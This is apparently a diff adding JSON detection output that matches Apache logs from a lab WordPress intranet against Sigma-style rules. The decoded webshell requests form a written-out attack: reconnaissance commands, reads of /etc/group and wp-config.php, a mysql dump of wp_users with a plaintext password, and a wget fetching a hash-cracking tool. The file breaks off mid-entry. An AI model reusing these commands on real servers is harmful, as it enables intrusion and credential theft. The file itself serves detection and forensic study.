@@ -1,0 +1,1212 @@
+{
+    "0": {
+        "id": 1,
+        "date_time_min": "2022-01-15T08:45:43.000000+00:00",
+        "date_time_max": "2022-01-15T10:22:14.000000+00:00",
+        "evidence_message": "http_request: GET / HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36",
+        "type_candidate": {
+            "sigma/web/proxy_generic/proxy_ua_frameworks.yml": {
+                "type": "Exploit Framework User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_malware.yml": {
+                "type": "Malware User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp.yml": {
+                "type": "Suspicious User Agent",
+                "source": "sigma",
+                "level": "high"
+            }
+        },
+        "type": "Exploit Framework User Agent",
+        "description": "Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs",
+        "category": "proxy",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.5",
+        "keys": {
+            "Request_URI": "/",
+            "HTTP_Method": "GET",
+            "Source_IP": "10.35.33.116",
+            "Response_Code": "200",
+            "User_Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36"
+        },
+        "count": 5,
+        "ids": [
+            1,
+            2,
+            3,
+            4,
+            5
+        ]
+    },
+    "1": {
+        "id": 6,
+        "date_time_min": "2022-01-18T12:37:49.000000+00:00",
+        "date_time_max": "2022-01-18T12:37:49.000000+00:00",
+        "evidence_message": "http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 192.168.115.21 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_scan_dirb.yml": {
+                "type": "Web Requests 404 Response Dirb Scan Detection",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "sigma/web/proxy_generic/proxy_ua_apt.yml": {
+                "type": "APT User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_frameworks.yml": {
+                "type": "Exploit Framework User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_malware.yml": {
+                "type": "Malware User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp.yml": {
+                "type": "Suspicious User Agent",
+                "source": "sigma",
+                "level": "high"
+            }
+        },
+        "type": "APT User Agent",
+        "description": "Detects suspicious user agent strings used in APT malware in proxy logs",
+        "category": "proxy",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Request_URI": "/wp-includes/js/tinymce/skins/wordpress/images/zope",
+            "HTTP_Method": "GET",
+            "Source_IP": "192.168.115.21",
+            "Response_Code": "404",
+            "User_Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "count": 4,
+        "ids": [
+            6,
+            7,
+            8,
+            9
+        ]
+    },
+    "2": {
+        "id": 10,
+        "date_time_min": "2022-01-18T12:38:00.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:01.000000+00:00",
+        "evidence_message": "http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            }
+        },
+        "type": "HTTP Request with Suspicious User Agent",
+        "description": "HTTP Request with Suspicious User Agent: GET / from 172.17.130.196 (code 200, user agent python-requests/2.27.1)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Request_URI": "/",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 3,
+        "ids": [
+            10,
+            11,
+            12
+        ]
+    },
+    "3": {
+        "id": 13,
+        "date_time_min": "2022-01-18T12:38:04.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:04.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"id\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_sysinfo.yml": {
+                "type": "Sysinfo Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Sysinfo Commands in HTTP Request",
+        "description": "Sysinfo Commands in HTTP Request: '[\"id\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"id\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            13
+        ]
+    },
+    "4": {
+        "id": 14,
+        "date_time_min": "2022-01-18T12:38:06.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:06.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"netstat\", \"-t\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_netconf.yml": {
+                "type": "Network Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Network Commands in HTTP Request",
+        "description": "Network Commands in HTTP Request: '[\"netstat\", \"-t\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"netstat\", \"-t\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            14
+        ]
+    },
+    "5": {
+        "id": 15,
+        "date_time_min": "2022-01-18T12:38:08.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:08.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"cat\", \"/etc/resolv.conf\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_read.yml": {
+                "type": "File Read Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/linux/process_creation/proc_creation_lnx_system_network_discovery.yml": {
+                "type": "System Network Discovery - Linux",
+                "source": "sigma",
+                "level": "informational"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "File Read Commands in HTTP Request",
+        "description": "File Read Commands in HTTP Request: '[\"cat\", \"/etc/resolv.conf\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"cat\", \"/etc/resolv.conf\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            15
+        ]
+    },
+    "6": {
+        "id": 16,
+        "date_time_min": "2022-01-18T12:38:09.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:09.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"ip\", \"addr\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_netconf.yml": {
+                "type": "Network Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Network Commands in HTTP Request",
+        "description": "Network Commands in HTTP Request: '[\"ip\", \"addr\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"ip\", \"addr\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            16
+        ]
+    },
+    "7": {
+        "id": 17,
+        "date_time_min": "2022-01-18T12:38:11.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:11.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"ps\", \"-A\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_proc.yml": {
+                "type": "Process Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Process Commands in HTTP Request",
+        "description": "Process Commands in HTTP Request: '[\"ps\", \"-A\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"ps\", \"-A\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            17
+        ]
+    },
+    "8": {
+        "id": 18,
+        "date_time_min": "2022-01-18T12:38:14.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:14.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"lsb_release\", \"-a\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_filesys.yml": {
+                "type": "Filesystem Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_sysinfo.yml": {
+                "type": "Sysinfo Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Filesystem Commands in HTTP Request",
+        "description": "Filesystem Commands in HTTP Request: '[\"lsb_release\", \"-a\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"lsb_release\", \"-a\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            18
+        ]
+    },
+    "9": {
+        "id": 19,
+        "date_time_min": "2022-01-18T12:38:16.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:17.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"cat\", \"/etc/group\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_lfi.yml": {
+                "type": "Local File Inclusion",
+                "source": "atlas",
+                "level": "high"
+            },
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_read.yml": {
+                "type": "File Read Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Local File Inclusion",
+        "description": "Local File Inclusion: '[\"cat\", \"/etc/group\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"cat\", \"/etc/group\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 2,
+        "ids": [
+            19,
+            20
+        ]
+    },
+    "10": {
+        "id": 21,
+        "date_time_min": "2022-01-18T12:38:19.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:19.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"date\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_temp.yml": {
+                "type": "Time-Temporal Information Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Time-Temporal Information Commands in HTTP Request",
+        "description": "Time-Temporal Information Commands in HTTP Request: '[\"date\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"date\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            21
+        ]
+    },
+    "11": {
+        "id": 22,
+        "date_time_min": "2022-01-18T12:38:21.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:21.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"ls\", \"-laR\", \"/var/www\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_filesys.yml": {
+                "type": "Filesystem Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Filesystem Commands in HTTP Request",
+        "description": "Filesystem Commands in HTTP Request: '[\"ls\", \"-laR\", \"/var/www\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"ls\", \"-laR\", \"/var/www\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            22
+        ]
+    },
+    "12": {
+        "id": 23,
+        "date_time_min": "2022-01-18T12:38:23.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:23.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"cat\", \"/var/www/intranet.price.fox.org/wp-config.php\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_read.yml": {
+                "type": "File Read Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "File Read Commands in HTTP Request",
+        "description": "File Read Commands in HTTP Request: '[\"cat\", \"/var/www/intranet.price.fox.org/wp-config.php\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"cat\", \"/var/www/intranet.price.fox.org/wp-config.php\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            23
+        ]
+    },
+    "13": {
+        "id": 24,
+        "date_time_min": "2022-01-18T12:38:25.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:25.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"mysql\", \"-u\", \"wordpress\", \"-ptainoox3aedeeSh\", \"wordpress_db\", \"-e\", \"\\\"select * from wp_users\\\"\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_db.yml": {
+                "type": "Database Commands in HTTP Request",
+                "source": "atlas",
+                "level": "critical"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            },
+            "sigma/web/webserver_generic/web_sql_injection_in_access_logs.yml": {
+                "type": "SQL Injection Strings In URI",
+                "source": "sigma",
+                "level": "high"
+            }
+        },
+        "type": "Database Commands in HTTP Request",
+        "description": "Database Commands in HTTP Request: '[\"mysql\", \"-u\", \"wordpress\", \"-ptainoox3aedeeSh\", \"wordpress_db\", \"-e\", \"\\\"select * from wp_users\\\"\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"mysql\", \"-u\", \"wordpress\", \"-ptainoox3aedeeSh\", \"wordpress_db\", \"-e\", \"\\\"select * from wp_users\\\"\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            24
+        ]
+    },
+    "14": {
+        "id": 25,
+        "date_time_min": "2022-01-18T12:38:27.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:27.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"cat\", \"/etc/profile\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_read.yml": {
+                "type": "File Read Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "File Read Commands in HTTP Request",
+        "description": "File Read Commands in HTTP Request: '[\"cat\", \"/etc/profile\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"cat\", \"/etc/profile\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            25
+        ]
+    },
+    "15": {
+        "id": 26,
+        "date_time_min": "2022-01-18T12:38:29.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:29.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"wget\", \"https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
